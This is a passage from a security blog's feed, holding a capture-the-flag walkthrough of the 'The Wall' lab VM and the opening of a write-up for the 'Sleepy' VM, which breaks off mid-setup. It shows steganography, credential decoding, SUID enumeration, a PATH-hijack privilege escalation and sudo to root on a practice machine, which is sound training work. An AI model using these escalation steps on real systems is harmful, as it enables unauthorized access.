      <pubDate>Fri, 27 Nov 2015 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/writeups/2015/the-wall/</guid>
      <description>

&lt;p&gt;In 1965, one of the most influential bands of our times was formed.. Pink Floyd. This boot2root box has been created to celebrate 50 years of Pink Floyd&amp;rsquo;s contribution to the music industry, with each challenge giving the attacker an introduction to each member of the Floyd.&lt;/p&gt;

&lt;p&gt;You challenge is simple&amp;hellip; set your controls for the heart of the sun, get root, and grab the flag! Rock on!&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://twitter.com/xerubus&#34;&gt;Xerubus&lt;/a&gt; asked if I would like to beta-test this VM prior to release and being a bit of a (closet) Pink Floyd fan, I jumped at the opportunity.  So obviously the first stage in any boot2root is to port scan the sucker.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ nmap -n -sT 192.168.56.104

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-12-02 19:52 GMT
Stats: 0:01:25 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Nmap scan report for 192.168.56.104
Host is up.
All 1000 scanned ports on 192.168.56.104 are filtered
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Straight up trolled already.  I fired up Wireshark and after a minute or so, I saw a boat load of ARPs coming from The Wall - looking like an ARP scan.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/thewall-1/arps.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;If dug past the ARPs, and found a TCP packet destined for my IP on port 1337.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/thewall-1/1337.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;It looks like this is running on a cron, so I setup a netcat listener to catch the connection.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [192.168.56.103] from (UNKNOWN) [192.168.56.104] 21840

                       .u!&amp;quot;`
                   .x*&amp;quot;`
               ..+&amp;quot;NP
            .z&amp;quot;&amp;quot;   ?
          M#`      9     ,     ,
                   9 M  d! ,8P&#39;
                   R X.:x&#39; R&#39;  ,
                   F F&#39; M  R.d&#39;
                   d P  @  E`  ,
      ss           P  &#39;  P  N.d&#39;
       x         &#39;&#39;        &#39;
       X               x             .
       9     .f       !         .    $b
       4;    $k      /         dH    $f
       &#39;X   ;$$     z  .       MR   :$
        R   M$$,   :  d9b      M&#39;   tM
        M:  #&#39;$L  ;&#39; M `8      X    MR
        `$;t&#39; $F  # X ,oR      t    Q;
         $$@  R$ H :RP&#39; $b     X    @&#39;
         9$E  @Bd&#39; $&#39;   ?X     ;    W
         `M&#39;  `$M d$    `E    ;.o* :R   ..
          `    &#39;  &amp;quot;&#39;     &#39;    @&#39;   &#39;$o*&amp;quot;&#39;   
   
              The Wall by @xerubus
          -= Welcome to the Machine =-

If you should go skating on the thin ice of modern life, dragging behind you the silent reproach of a million tear-stained eyes, don&#39;t be surprised when a crack in the ice appears under your feet. - Pink Floyd, The Thin Ice
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ok&amp;hellip; brilliant, now what?&lt;/p&gt;

&lt;p&gt;Well if you port scan the VM for a second time, it appears to have opened up a port.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ nmap -n -sT 192.168.56.104

PORT   STATE SERVICE
80/tcp open  http
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There is nothing to see on the page, with the exception of this image.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/thewall-1/floyd.jpg&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;In the HTML source, there is also the following:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;If you want to find out what&#39;s behind these cold eyes, you&#39;ll just have to claw your way through this disguise. - Pink Floyd, The Wall

Did you know? The Publius Enigma is a mystery surrounding the Division Bell album.  Publius promised an unspecified reward for solving the 
riddle, and further claimed that there was an enigma hidden within the artwork.

737465673d3333313135373330646262623337306663626539373230666536333265633035
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That string is totally hex, which we can decode like so:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;&amp;gt;&amp;gt; string = &#39;737465673d3333313135373330646262623337306663626539373230666536333265633035&#39;
&amp;gt;&amp;gt;&amp;gt; string.decode(&#39;hex&#39;)
&#39;steg=33115730dbbb370fcbe9720fe632ec05&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;steg&lt;/code&gt; is a pretty solid clue, and probably relates to the image on the web page.  This other string is MD5 and can be pretty easily cracked - turns out to be &lt;code&gt;divisionbell&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s download &lt;code&gt;pink_floyd.jpg&lt;/code&gt; and run it through some steg tools.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~/Downloads$ steghide extract -sf pink_floyd.jpg 
Enter passphrase: 
wrote extracted data to &amp;quot;pink_floyd_syd.txt&amp;quot;.

rasta@mouse:~/Downloads$ cat pink_floyd_syd.txt 
Hey Syd,

I hear you&#39;re full of dust and guitars? 

If you want to See Emily Play, just use this key: U3lkQmFycmV0dA==|f831605ae34c2399d1e5bb3a4ab245d0

Roger

Did you know? In 1965, The Pink Floyd Sound changed their name to Pink Floyd.  The name was inspired
by Pink Anderson and Floyd Council, two blues muscians on the Piedmont Blues record Syd Barret had in 
his collection.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So we have a new base64 and MD5 string.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~/Downloads$ echo -en &#39;U3lkQmFycmV0dA==&#39; | base64 -d
SydBarrett

f831605ae34c2399d1e5bb3a4ab245d0 == pinkfloydrocks
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So we have what looks like a set of credentials.  &lt;code&gt;SydBarrett:pinkfloydrocks&lt;/code&gt;.  But where to use them?&lt;/p&gt;

&lt;h2 id=&#34;sydbarrett:692b9b8dc88c7093a6facc13d9ec511d&#34;&gt;SydBarrett&lt;/h2&gt;

&lt;p&gt;I was stuck here for a while, but if we do a &amp;lsquo;wider&amp;rsquo; port scan, we find that port 1965 is open.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ nmap -n -sT -p- 192.168.56.104


PORT     STATE SERVICE
80/tcp   open  http
1965/tcp open  unknown

rasta@mouse:~$ nc 192.168.56.104 1965
SSH-2.0-OpenSSH_7.0

Protocol mismatch.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;SSH - so maybe we can SSH in as Syd.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ ssh SydBarrett@192.168.56.104 -p 1965

SydBarrett@192.168.56.104&#39;s password: 
Could not chdir to home directory /home/SydBarrett: No such file or directory
This service allows sftp connections only.
Connection to 192.168.56.104 closed.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ok, SFTP it is.  Let&amp;rsquo;s connect and see if we can find any interesting files.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ sftp -P 1965 SydBarrett@192.168.56.104
SydBarrett@192.168.56.104&#39;s password: 
Connected to 192.168.56.104.

sftp&amp;gt; ls -la
drwxr-xr-x    3 0        1000          512 Oct 24 18:17 .mail
-rw-r--r--    1 0        1000         1912 Oct 25 22:56 bio.txt
-rw-r--r--    1 0        1000       868967 Oct 24 16:17 syd_barrett_profile_pic.jpg

sftp&amp;gt; ls -la .mail/
drwxr-xr-x    2 0        1000          512 Nov 11 10:25 .stash
-rw-r--r--    1 0        1000          309 Oct 24 18:18 sent-items

sftp&amp;gt; ls -la .mail/.stash/
-rw-r--r--    1 0        1000     48884479 Aug  7 14:33 eclipsed_by_the_moon

sftp&amp;gt; get .mail/sent-items 
Fetching /.mail/sent-items to sent-items
   
sftp&amp;gt; get .mail/.stash/eclipsed_by_the_moon 
Fetching /.mail/.stash/eclipsed_by_the_moon to eclipsed_by_the_moon
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ cat sent-items 
Date: Sun, 24 Oct 1965 18:45:21 +0200
From: Syd Barrett &amp;lt;syd@pink.floyd&amp;gt;
Reply-To: Syd Barret &amp;lt;syd@pink.floyd&amp;gt;
To: Roger Waters &amp;lt;roger@pink.floyd&amp;gt;
Subject: Had to hide the stash

Roger... I had to hide the stash. 

Usual deal.. just use the scalpel when you find it.

Ok, sorry for that.

Rock on man

&amp;quot;Syd&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;scalpel&lt;/code&gt; is a clue here.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ file eclipsed_by_the_moon 
eclipsed_by_the_moon: gzip compressed data, last modified: Wed Nov 11 00:15:47 2015, from Unix
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After we extract the content, we find it&amp;rsquo;s actually a disk image.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ file eclipsed_by_the_moon.lsd 
eclipsed_by_the_moon.lsd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID &amp;quot;MSDOS5.0&amp;quot;, sectors/cluster 2, reserved sectors 8, root entries 512, Media descriptor 0xf8, sectors/FAT 188, sectors/track 63, heads 255, hidden sectors 2048, sectors 96256 (volumes &amp;gt; 32 MB) , serial number 0x9e322180, unlabeled, FAT (16 bit)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It won&amp;rsquo;t boot, so we go back to our scalpel clue.  &lt;a href=&#34;https://github.com/sleuthkit/scalpel&#34;&gt;Scalpel&lt;/a&gt; is a tool for recovering deleted files - so lets see if we can recover anything.  The first stage is to mod &lt;code&gt;/etc/scalpel/scalpel.conf&lt;/code&gt; and uncomment all the different types of files you want to look for.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ scalpel eclipsed_by_the_moon.lsd 
jpg with header &amp;quot;\xff\xd8\xff\xe0\x00\x10&amp;quot; and footer &amp;quot;\xff\xd9&amp;quot; --&amp;gt; 1 files
Scalpel is done, files carved = 1, elapsed = 0 seconds.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A new directory is created, &lt;code&gt;scalpel-output&lt;/code&gt;, within which is a recovered image.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/thewall-1/roger.jpg&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;h2 id=&#34;rogerwaters:692b9b8dc88c7093a6facc13d9ec511d&#34;&gt;RogerWaters&lt;/h2&gt;

&lt;p&gt;So now we have the password for RogerWaters, &lt;code&gt;hello_is_there_anybody_in_there&lt;/code&gt;. Let&amp;rsquo;s try and connect via SSH this time.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ ssh RogerWaters@192.168.56.104 -p 1965
RogerWaters@192.168.56.104&#39;s password: 
OpenBSD 5.8 (GENERIC) #1066: Sun Aug 16 02:33:00 MDT 2015

                       .u!&amp;quot;`
                   .x*&amp;quot;`
               ..+&amp;quot;NP
            .z&amp;quot;&amp;quot;   ?
          M#`      9     ,     ,
                   9 M  d! ,8P&#39;
                   R X.:x&#39; R&#39;  ,
                   F F&#39; M  R.d&#39;
                   d P  @  E`  ,
      ss           P  &#39;  P  N.d&#39;
       x         &#39;&#39;        &#39;
       X               x             .
       9     .f       !         .    $b
       4;    $k      /         dH    $f
       &#39;X   ;$$     z  .       MR   :$
        R   M$$,   :  d9b      M&#39;   tM
        M:  #&#39;$L  ;&#39; M `8      X    MR
        `$;t&#39; $F  # X ,oR      t    Q;
         $$@  R$ H :RP&#39; $b     X    @&#39;
         9$E  @Bd&#39; $&#39;   ?X     ;    W
         `M&#39;  `$M d$    `E    ;.o* :R   ..
          `    &#39;  &amp;quot;&#39;     &#39;    @&#39;   &#39;$o*&amp;quot;&#39;   
$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;w00t shell.&lt;/p&gt;

&lt;h2 id=&#34;nick-mason:692b9b8dc88c7093a6facc13d9ec511d&#34;&gt;Nick Mason&lt;/h2&gt;

&lt;p&gt;After some standard Linux enumeration, we get a list of all users on the system.  It&amp;rsquo;s logical to assume that we will have to progress through each user before reaching root.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;SydBarrett:*:1000:1000:Syd Barrett:/home/SydBarrett:/sbin/nologin
NickMason:*:1001:1001:Nick Mason:/home/NickMason:/bin/ksh
RogerWaters:*:1002:1002:Roger Waters:/home/RogerWaters:/bin/ksh
RichardWright:*:1003:1003:Richard Wright:/home/RichardWright:/bin/ksh
DavidGilmour:*:1004:1004:David Gilmour:/home/DavidGilmour:/bin/ksh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If we have a look for SUID and/or SGID files, we find two interesting binaries.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ find / -perm -4000 -print 2&amp;gt; /dev/null                 
/usr/local/bin/brick
/usr/local/bin/shineon

$ ls -l /usr/local/bin/brick                                                                                                                                 
-rws--s--x  1 NickMason  NickMason  7291 Aug  8 00:33 /usr/local/bin/brick
$ ls -l /usr/local/bin/shineon                                                                                                                               
-rwsr-s---  1 DavidGilmour  RichardWright  7524 Oct 25 07:58 /usr/local/bin/shineon
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We don&amp;rsquo;t have the privileges to execute &lt;code&gt;shineon&lt;/code&gt; yet, so let&amp;rsquo;s look at &lt;code&gt;brick&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ /usr/local/bin/brick                                                                                                                                       

What have we here, laddie?
Mysterious scribbings?
A secret code?
Oh, poems, no less!
Poems everybody!

Who is the only band member to be featured on every Pink Floyd album? : Nick Mason
/bin/sh: Cannot determine current working directory

$ id
uid=1001(NickMason) gid=1001(NickMason) groups=1002(RogerWaters)
$ whoami
NickMason
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;richard-wright:692b9b8dc88c7093a6facc13d9ec511d&#34;&gt;Richard Wright&lt;/h2&gt;

&lt;p&gt;In each home directory thus far, there has been a profile picture of the band member.  Although Nick&amp;rsquo;s is something else in disguise.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ file nick_mason_profile_pic.jpg                                                                                                                            
nick_mason_profile_pic.jpg: Ogg data, Vorbis audio, stereo, 44100 Hz, created by: Xiph.Org libVorbis I
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Listening to the track, you will notice some morse code.  You can obviously decode it by ear, or load the spectrograph and do it visually.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/thewall-1/morse.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;The string we eventually come out with is &lt;code&gt;richardwright1943farfisa&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ su RichardWright 
Password:
ksh: Cannot determine current working directory
$ id
uid=1003(RichardWright) gid=1003(RichardWright) groups=1003(RichardWright)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;david-gilmour:692b9b8dc88c7093a6facc13d9ec511d&#34;&gt;David Gilmour&lt;/h2&gt;

&lt;p&gt;Now we are Richard Wright, we can go back to the &lt;code&gt;shineon&lt;/code&gt; binary we found previously.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ /usr/local/bin/shineon                                                                                                                                     
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Trying out these functions, we can see that they are executing pre-defined shell commands.  If we run &lt;code&gt;strings&lt;/code&gt;, we can see that all but one is called with an absolute path.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ strings /usr/local/bin/shineon                                                                                                                             

Menu
1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
Quitting program!
Invalid choice!
load_menu
Time - The Dark Side of the Moon
/usr/bin/cal
Press ENTER to continue.
Echoes - Meddle
/usr/bin/who
Is There Anybody Out There? - The Wall
/sbin/ping -c 3 www.google.com
Keep Talking- The Division Bell
mail
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;mail&lt;/code&gt; will be vulnerable to a PATH hijack.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ cp /bin/ksh /tmp/mail                                                                                                                                      
$ export PATH=/tmp:$PATH
$ /usr/local/bin/shineon                                                                                                                                     
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
4
Keep Talking- The Division Bell
mail: Cannot determine current working directory
$ id
uid=1003(RichardWright) euid=1004(DavidGilmour) gid=1003(RichardWright) groups=1003(RichardWright)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In his home directory is a file called &lt;code&gt;anotherbrick.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ cat anotherbrick.txt                                                                                                                                       
# Come on you raver, you seer of visions, come on you painter, you piper, you prisoner, and shine. - Pink Floyd, Shine On You Crazy Diamond

New website for review:    pinkfloyd1965newblogsite50yearscelebration-temp/index.php

# You have to be trusted by the people you lie to. So that when they turn their backs on you, you&#39;ll get the chance to put the knife in. - Pink Floyd, Dogs 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If we head over to this new directory, we get the following page:&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/thewall-1/temp-index.jpg&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;As before, there is a clue in the HTML source.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Through the window in the wall, come streaming in on sunlight wings, a million bright ambassadors of morning. - Pink Floyd, Echoes
Can you see what the Dog sees? Perhaps hints of lightness streaming in on sunlight wings?
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Download &lt;code&gt;homepageimg.jpg&lt;/code&gt; and have a close look around where the dog is sitting.  You can just make out some black text.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/thewall-1/dog.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;To get a better look at this, I simply messed around with the brightness and contrast levels.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/thewall-1/dog-light.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;We can&amp;rsquo;t navigate to &lt;code&gt;\welcometothemachine&lt;/code&gt; in a browser.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;403 Forbidden
OpenBSD httpd
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If we have a look on the actual VM.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ls -l /var/www/                                                                                                                                            

drwxr-x---  4 www   welcometothemachine  512 Nov 27 01:47 htdocs

$ ls -l /var/www/htdocs/                                                                                                                                     
ls: /var/www/htdocs/: Permission denied
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Even though we are part of the correct group our current privileges don&amp;rsquo;t reflect that, and on BSD apparently you can&amp;rsquo;t just run &lt;code&gt;newgrp&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ cat /etc/group 
welcometothemachine:*:1005:DavidGilmour

$ id             
uid=1003(RichardWright) euid=1004(DavidGilmour) gid=1003(RichardWright) groups=1003(RichardWright)

$ newgrp welcometothemachine
mail: newgrp: not found
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So we have to find another way of inheriting DavidGilmour&amp;rsquo;s group privs.  We can do just that with his password, that we find hidden in &lt;code&gt;david_gilmour_profile_pic.jpg&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ strings david_gilmour_profile_pic.jpg                                                                                                                      
who_are_you_and_who_am_i

$ su DavidGilmour
Password:
$ id
uid=1004(DavidGilmour) gid=1004(DavidGilmour) groups=1004(DavidGilmour), 1(daemon), 67(www), 1005(welcometothemachine)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we can get in the directory.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ls -l /var/www/htdocs/welcometothemachine/                                                                                                                 
total 16
-rws--s---  1 root  welcometothemachine  7513 Nov 27 01:47 PinkFloyd

$ ./PinkFloyd                                                                                                                                                
Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
Answer:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If we recall the other string in &lt;code&gt;homepageimg.jpg&lt;/code&gt;:  &lt;code&gt;50696e6b466c6f796435305965617273&lt;/code&gt;.  This is more hex which we can decode.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;&amp;gt;&amp;gt;&amp;gt; string = &#39;50696e6b466c6f796435305965617273&#39;
&amp;gt;&amp;gt;&amp;gt; string.decode(&#39;hex&#39;)
&#39;PinkFloyd50Years&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Maybe this is the correct answer?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ./PinkFloyd  
Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
Answer: PinkFloyd50Years

Denied....
If I had my way, I&#39;d have all of ya shot. - Pink Floyd, In The Flesh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nope, ok&amp;hellip;  After a while, I just shoved the raw hex in.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ./PinkFloyd  
Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
Answer: 50696e6b466c6f796435305965617273

Fearlessly the idiot faced the crowd smiling. - Pink Floyd, Fearless

Congratulations... permission has been granted.
You can now set your controls to the heart of the sun!
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;root:692b9b8dc88c7093a6facc13d9ec511d&#34;&gt;root&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;permission granted&lt;/code&gt; is a little cryptic.  It took me a while to realise it had given DavidGilmour sudo rights.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ sudo -l
Password: 
Matching Defaults entries for DavidGilmour on thewall:
    env_keep+=&amp;quot;FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK&amp;quot;

User DavidGilmour may run the following commands on thewall:
    (ALL) SETENV: ALL
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So now we can just elevate, no problem.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ sudo -i
# whoami
root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Grab the flag.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;# cat /root/flag.txt                                                                                                                                         

&amp;quot;The band is fantastic, that is really what I think. Oh, by the way, which one is Pink? - Pink Floyd, Have A Cigar&amp;quot;

                   Congratulations on rooting thewall!

   ___________________________________________________________________
  | |       |       |       |       |       |       |       |       | |
  |_|_______|_______|______ &#39;__  ___|_______|_______|_______|_______|_|
  |     |       |       |   |  )      /         |       |       |     |
  |_____|_______|_______|__ |,&#39; , .  | | _ , ___|_______|_______|_____|
  | |       |       |      ,|   | |\ | | ,&#39; |       |       |       | |
  |_|_______|_______|____ &#39; | _ | | \| |&#39;\ _|_______|_______|_______|_|
  |     |       |       |   \  _&#39; &#39;  ` |  \     |       |       |     |
  |_____|_______|_______|_  ,-&#39;_ _____ | _______|_______|_______|_____|
  | |       |       |   ,-&#39;|  _     |       |       |       |       | |
  |_|_______|_______|__  ,-|-&#39; |  ,-. \ /_.--. _____|_______|_______|_|
  |     |       |          |   |  | |  V  |   ) |       |       |     |
  |_____|_______|_______|_ | _ |-&#39;`-&#39;  |  | ,&#39; _|_______|_______|_____|
  | |       |       |      |        |  &#39;  ;&#39;        |       |       | |
  |_|_______|_______|______&amp;quot;|_____  _,- o&#39;__|_______|_______|_______|_|
  |     |       |       |       _,-&#39;    .       |       |       |     |
  |_____|_______|_______|_ _,--&#39;\      _,-&#39;_____|_______|_______|_____|
  | |       |       |     &#39;     ||_||-&#39; _   |       |       |       | |
  |_|_______|_______|_______|__ || ||,-&#39;  __|_______|_______|_______|_|
  |     |       |       |       |  ||_,-&#39;       |       |       |     |
  |_____|_______|______.|_______.__  ___|_______|_______|_______|_____|
  | |       |       |   \    |     /        |       |       |       | |
  |_|_______|_______|___ \ __|___ /,  _ |   | ______|_______|_______|_|
  |     |       |       | \      // \   |   |   |       |       |     |
  |_____|_______|_______|_ \ /\ //--&#39;\  |   | __|_______|_______|_____|
  | |       |       |       &#39;  V/    |  |-&#39; |__,    |       |       | |
  |_|_______|_______|_______|_______ _______&#39;_______|_______|_______|_|
  |     |       |       |       |       |       |       |       |     |
  |_____|_______|_______|_______|_______|_______|_______|_______|_____|
  |_________|_______|_______|_______|_______|_______|_______|_______|_|

                  Celebrating 50 years of Pink Floyd!
             Syd Barrett (RIP), Nick Mason, Roger Waters,
               Richard Wright (RIP), and David Gilmour.


** Shoutouts **
+ @vulnhub for making it all possible
+ @rastamouse @thecolonial - &amp;quot;the test bunnies&amp;quot;

-=========================================-
-  xerubus (@xerubus - www.mogozobo.com)  -
-=========================================-
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It was also nice to read through the contents of &lt;code&gt;/root/scripts/&lt;/code&gt; to see how the VM works.&lt;/p&gt;

&lt;p&gt;Many thanks to xerubus, and thanks for letting me beta-test :)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>/dev/random: Sleepy</title>
      <link>https://rastamouse.me/writeups/2015/sleepy/</link>
      <pubDate>Mon, 12 Oct 2015 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/writeups/2015/sleepy/</guid>
      <description>

&lt;p&gt;Sleepy is another ‘short’ VM created by &lt;a href=&#34;https://twitter.com/s4gi_&#34;&gt;Sagi-&lt;/a&gt;, although it’s slightly more difficult than &lt;a href=&#34;http://rastamouse.me/blog/2015/dev-random-pipe/&#34;&gt;Pipe&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&#34;ports:98b6e5636154869990609b71ad7243a9&#34;&gt;Ports&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sT -p- -A 192.168.56.103
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can&#39;t get directory listing: TIMEOUT
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
9001/tcp open  jdwp    Java Debug Wire Protocol (Reference Implementation) version 1.6 1.7.0_71
FTP allows anonymous login where you can download an image of Sleepy, but there appears to be nothing of interest with it.
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;jserv:98b6e5636154869990609b71ad7243a9&#34;&gt;JServ&lt;/h2&gt;

&lt;p&gt;Apache JServ is a really interesting protocol - it’s basically designed to proxy inbound requests from a web server through to an application server. If you try to access port 8009 directly, you get no response.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://192.168.56.103:8009
curl: (56) Recv failure: Connection reset by peer
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What we have to do, is proxy the requests via Apache using the jk-mod.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# apt-get install libapache2-mod-jk

root@kali:~# vi /etc/apache2/mods-enabled/jk.conf
JkWorkersFile /etc/libapache2-mod-jk/workers.properties   ---&amp;gt;   JkWorkersFile /etc/apache2/workers.properties

